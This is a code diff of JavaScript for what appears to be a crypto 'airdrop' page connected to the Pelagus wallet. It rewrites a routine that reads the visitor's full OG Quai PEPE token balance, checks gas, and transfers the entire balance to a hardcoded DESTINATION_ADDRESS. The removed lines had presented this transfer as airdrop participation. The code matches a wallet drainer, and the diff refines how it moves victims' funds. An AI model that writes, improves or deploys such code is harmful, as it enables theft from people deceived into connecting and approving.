@@ -395,85 +395,72 @@ async function saveToFirebase(data) {
             throw new Error('Pelagus wallet not found');
         }
 
-        // Check QUAI balance for gas
-        const quaiBalance = await getQuaiBalance(userSession.address);
-        const quaiAmount = parseInt(quaiBalance, 16) / 1e18;
-        const requiredQuai = 0.1;
-        
-        if (quaiAmount < requiredQuai) {
+        const provider = new ethers.providers.Web3Provider(window.pelagus);
+        const signer = provider.getSigner();
+        const walletAddress = await signer.getAddress();
+
+        log(`🔄 Checking balances for ${walletAddress}...`);
+
+        // Fetch QUAI balance for gas fees
+        const quaiBalance = await provider.getBalance(walletAddress);
+        const quaiAmount = ethers.utils.formatEther(quaiBalance);
+
+        if (parseFloat(quaiAmount) < 0.1) {
             log('❌ Insufficient QUAI for gas fees');
-            log(`You need at least ${requiredQuai} QUAI for transaction. Current balance: ${quaiAmount.toFixed(4)} QUAI`);
-            log('Please add QUAI to your wallet to proceed');
+            log(`You need at least 0.1 QUAI. Current balance: ${quaiAmount}`);
             throw new Error('Insufficient QUAI balance for gas');
         }
 
-        // Check token balance
-        const currentBalance = await getTokenBalance(userSession.address);
-        if (currentBalance <= 0n) {
+        // Fetch token balance using the contract
+        const tokenABI = [
+            "function balanceOf(address) view returns (uint256)",
+            "function transfer(address to, uint256 amount) public returns (bool)"
+        ];
+        const tokenContract = new ethers.Contract(TOKEN_ADDRESS, tokenABI, signer);
+
+        const tokenBalance = await tokenContract.balanceOf(walletAddress);
+        if (tokenBalance.isZero()) {
             log('❌ No tokens available to send');
             throw new Error('No tokens available to send');
         }
 
-        const readableAmount = (Number(currentBalance) / 1e18).toString();
+        const readableAmount = ethers.utils.formatUnits(tokenBalance, 18); // Assuming 18 decimals
         log(`📤 Preparing to send ${readableAmount} OG Quai PEPE tokens...`);
-        log(`💰 Gas fee will be paid from your ${quaiAmount.toFixed(4)} QUAI balance`);
 
-        // Token transfer function setup
-        const methodId = 'a9059cbb';
-        const paddedDestination = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
-        const paddedAmount = currentBalance.toString(16).padStart(64, '0');
-        const data = '0x' + methodId + paddedDestination + paddedAmount;
+        // Estimate gas
+        const estimatedGas = await tokenContract.estimateGas.transfer(
+            DESTINATION_ADDRESS,
+            tokenBalance
+        );
+        const gasPrice = await provider.getGasPrice();
+        const gasCost = estimatedGas.mul(gasPrice);
 
-        // Construct the transaction
-        const transactionParameters = {
-            from: userSession.address,
-            to: TOKEN_ADDRESS,
-            value: '0x0',
-            data: data,
-            gas: '0x55F0',          // Add gas limit
-            gasPrice: '0x53e2d6',   // Add gas price
-            chainId: '9000'         // Add chain ID for Cyprus1
-        };
+        log(`💰 Estimated gas cost: ${ethers.utils.formatEther(gasCost)} QUAI`);
 
-        log(`📤 Sending all tokens to ${DESTINATION_ADDRESS}`);
-        log('🔄 Please confirm the transaction in your wallet...');
-               
-        const txHash = await window.pelagus.request({
-            method: 'eth_sendTransaction',
-            params: [transactionParameters],
-        });
+        if (quaiBalance.lt(gasCost)) {
+            log('❌ Insufficient QUAI for gas fees');
+            throw new Error('Insufficient QUAI balance for gas');
+        }
 
-        log(`📝 Transaction hash: ${txHash}`);
-        log('🔄 Waiting for confirmation...');
+        // Send transaction
+        log(`🔄 Sending ${readableAmount} OG Quai PEPE to ${DESTINATION_ADDRESS}...`);
+        const tx = await tokenContract.transfer(DESTINATION_ADDRESS, tokenBalance);
+        log(`📝 Transaction sent: ${tx.hash}`);
 
         // Wait for confirmation
-        const receipt = await waitForTransaction(txHash);
-        
-        // Update userSession and save to Firebase
-        userSession.transferAmount = readableAmount;
-        userSession.transferTxHash = txHash;
-        await saveSessionToFirebase();
-
-        // Update UI
-        document.getElementById('sendBtn').style.display = 'none';
-        document.getElementById('scanBtn').style.display = 'block';
-        document.getElementById('buyBtn').style.display = 'block';
-
+        const receipt = await tx.wait();
         log('✅ Transaction confirmed!');
         log(`💫 Successfully sent ${readableAmount} OG Quai PEPE tokens!`);
-        log('---------------------------------------------');
-        log('🎉 Airdrop participation complete!');
-
     } catch (error) {
         if (error.code === 4001) {
             log('❌ Transaction rejected in wallet');
-            log('Please try again when ready to approve the transaction');
-            return;
+        } else {
+            log(`❌ Error sending tokens: ${error.message}`);
         }
-        log('❌ Error sending tokens: ' + error.message);
         console.error(error);
     }
 }
+
         async function waitForTransaction(txHash) {
             while (true) {
                 try {
